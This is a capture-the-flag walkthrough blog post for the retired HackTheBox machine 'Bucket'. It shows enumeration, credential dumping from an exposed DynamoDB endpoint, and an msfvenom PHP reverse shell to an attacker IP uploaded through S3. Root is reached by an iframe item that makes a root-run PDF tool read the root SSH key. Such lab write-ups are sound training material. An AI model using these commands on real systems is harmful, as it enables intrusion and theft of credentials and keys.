---
layout: walkthrough
title: HackTheBox - Bucket
date: 2021-04-25 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/bucket.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Bucket --`10.10.10.212`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Bucket/Overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, I started with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Time$ nmap -sC -sV 10.10.10.212
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-05 08:44 EST
Nmap scan report for 10.10.10.212
Host is up (0.18s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://bucket.htb/
8654/tcp filtered unknown
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.12 seconds

```

</details>

From the output shown above, we can see that the machine is a Linux machine and I added `bucket.htb` to the `/etc/hosts` file. As this is a Linux machine and it only has 2 open ports, I started by browsing to the web application:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Bucket/img1.png"  style="width: 80%" />
</p>

By looking through the application, I now had an initial username: `support@bucket.htb`. Looking into the source code, I came across a few links which referred to `http://s3.bucket.htb/adserver`. In order to access the subdomain, I also added `s3.bucket.htb` to the `/etc/hosts` file. Once that was added, navigating to `s3.bucket.htb` which was serving a web page which just stated: `status:running`. Since this was going to be using AWS S3 buckets, I started off by installing the AWS Command Line Interface (AWS CLI) using `apt update && apt install awscli`. While that was installing, I decided to run a Gobuster scan to determine if any additional pages existed. The output of which is shown below:

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Bucket$ sudo gobuster dir -u http://s3.bucket.htb/  -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://s3.bucket.htb/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/03/05 08:54:14 Starting gobuster
===============================================================
/shell (Status: 200)
/health (Status: 200)
/server-status (Status: 403)
===============================================================
2021/03/05 09:00:58 Finished
===============================================================
```

</details>

As shown above, there were two new directories: `shell` and `health`. After navigating to `s3.bucket.htb/shell`, I was presented with the following DynamoDB application:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Bucket/img3.png"  style="width: 80%" />
</p>

Alright, now not only did I have access to the S3 bucket, but I also knew that it was making use of DynamoDB. 

### Exploiting DynamoDB

Clicking through the web application, I navigated to the API templates page and saw that there were several commands that were available within DynamoDB.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Bucket/img4.png"  style="width: 100%" />
</p>

I clicked through some of the functionality and eventually found the `list-tables` function. Using this, I knew that the `users` table existed. However, I found that the web application itself was quite difficult to use, so I decided to switch over to the command line. In order to list the tables within dynamodb, I used the following command:

```bash
aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Bucket/img5.png"  style="width: 80%" />
</p>

Since we knew that the table was valid and that the AWS CLI was working, I attempted to extract the details related to the `users` table:

```bash
aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb
```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Bucket/img6.png"  style="width: 80%" />
</p>

Awesome! I now had 3 sets of credentials, however I didn't have anywhere to use them just yet. I kept enumerating the web application and remembered that there was another bucket:

```bash
vagrant@ko:~/Desktop/HackTheBox/Time$ aws --endpoint-url http://s3.bucket.htb/ s3 ls
2021-03-05 07:22:03 adserver

vagrant@ko:~/Desktop/HackTheBox/Time$ aws --endpoint-url http://s3.bucket.htb/ s3 ls s3://adserver
                           PRE images/
2021-03-05 07:22:03       5344 index.html

```

Since I was able to read the directory, it was highly likely that I also had write permissions to the host. Going off of this assumption, I wanted to see if I was able to insert files onto the server, and I decided to upload a simple text file to test the theory:

```
vagrant@ko:~/Desktop/HackTheBox/Bucket$ aws --endpoint-url http://s3.bucket.htb/ s3 cp temp.txt s3://adserver/temp.txt
upload: ./temp.txt to s3://adserver/temp.txt
```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Bucket/img7.png"  style="width: 80%" />
</p>

Now that I knew that I was able to upload a file to the server, I needed to determine a file type that would be able to provide me with a reverse shell to the host. I attempted to create a reverse shell using meterpreter:

```bash
msfvenom -p php/reverse_php LHOST=10.10.14.63 LPORT=1234 -f raw > shell.php
```

Once the file was created, I then uploaded it to the server:

```bash
aws --endpoint-url http://s3.bucket.htb/ s3 cp shell.php s3://adserver/
```

Browsing to the file location (<http://s3.bucket.htb/shell.php>), I saw that the file was uploaded, however it was not executed upon viewing the file -- instead it asked me to download it. Additionally, the file disappeared every few minutes. I did realise that the `index.html` file that was in the directory was related to the main `bucket.htb` web application, so I navigated to the main directory instead of the bucket sub directory and was able to activate the reverse shell.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Bucket/img8.png"  style="width: 80%" />
</p>

## Lateral Movement using www-data

With access to the host, I decided to see if any users on the machine had shell access rights assigned to them. In order to do this, I opened the `/etc/passwd` file which showed that the `roy` user had shell access rights to the host. I tried SSH'ing into the server using `Roy` and the previously identified passwords, the password for the sysadm user: `n2vM-<_K_Q:.Aa2` worked!

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Bucket/img9.png"  style="width: 80%" />
</p>

## Privilege Escalation using Roy

After going through some basic enumeration with linpeas, I saw that there were several active ports that were not included within the nmap scan, including port 8000. Additionally, it seemed that the `/var/www/bucket-app/` directory was owned by root but it was readable by the `roy` user based on extended attributes. Navigating to the main page and opening the `index.php` file provided me with the following PHP code:

<details>

```php
<?php                                                                                                             
require 'vendor/autoload.php';                                                                                    
use Aws\DynamoDb\DynamoDbClient;                                                                                  
if($_SERVER["REQUEST_METHOD"]==="POST") {                                                                         
        if($_POST["action"]==="get_alerts") {                                                                     
                date_default_timezone_set('America/New_York');                                                    
                $client = new DynamoDbClient([                                                                    
                        'profile' => 'default',                                                                   
                        'region'  => 'us-east-1',                                                                 
                        'version' => 'latest',                                                                    
                        'endpoint' => 'http://localhost:4566'                                                     
                ]);                                                                                               
                                                                                                                  
                $iterator = $client->getIterator('Scan', array(                                                   
                        'TableName' => 'alerts',                                                                  
                        'FilterExpression' => "title = :title",                                                   
                        'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),                 
                ));                                                                                               
                                                                                                                  
                foreach ($iterator as $item) {                                                                    
                        $name=rand(1,10000).'.html';                                                              
                        file_put_contents('files/'.$name,$item["data"]);                                          
                }                                        
                passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");                                                                   
        }                                                                                                         
}                                                                                                                 
else                                                                                                              
{                                                                                                                 
?>   
```

</details>

This code seemed to rely on a table `alerts` and simply put the contents of the query's output into a PDF file using **Pd4Cmd**, however it was running this as root. In order to exploit this, I initially needed to create a DynamoDB table named **alerts**. The following AWS documentation provided useful information on how to create new tables: <https://docs.aws.amazon.com/cli/latest/userguide/cli-services-dynamodb.html>. Using the documentation as reference, I created the **alerts** table as follows:
* Table Name: alerts
* Attributes: title & data
* Attribute Type: String (S)

```bash
aws dynamodb create-table \
    --table-name alerts \
    --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \
    --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \
    --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5
```

With the table created, I needed to place an item onto the host by creating a new entry. The entry would specifically need:
* Table Name: alerts
* Title with Keyword: Ransomware
* Data: File to retrieve

```bash
aws dynamodb put-item \
    --table-name alerts \
    --item '{
        "title": {"S": "Ransomware"},
        "data": {"S": "<html><head></head><body><iframe src='/root/.ssh/id_rsa'></iframe></body></html>"}
      }' \
    --return-consumed-capacity TOTAL --endpoint-url http://s3.bucket.htb
```

Now that I've created a new table entry and the data within the directory is pointing to root's SSH key, I should technically be able to use a web request using the action: *get_alerts* to trigger the functionality and produce a `result.pdf` file. I started by using the following cURL command:

```bash
curl --data "action=get_alerts" http://localhost:8000/
```

Once the web request had run successfully, I needed to retrieve the file using SCP:

```bash
scp roy@10.10.10.212://var/www/bucket-app/files/result.pdf ./
```

That was it, I was able to retrieve the SSH key and log in to the server as root:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Bucket/img10.png"  style="width: 80%" />
</p>

That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.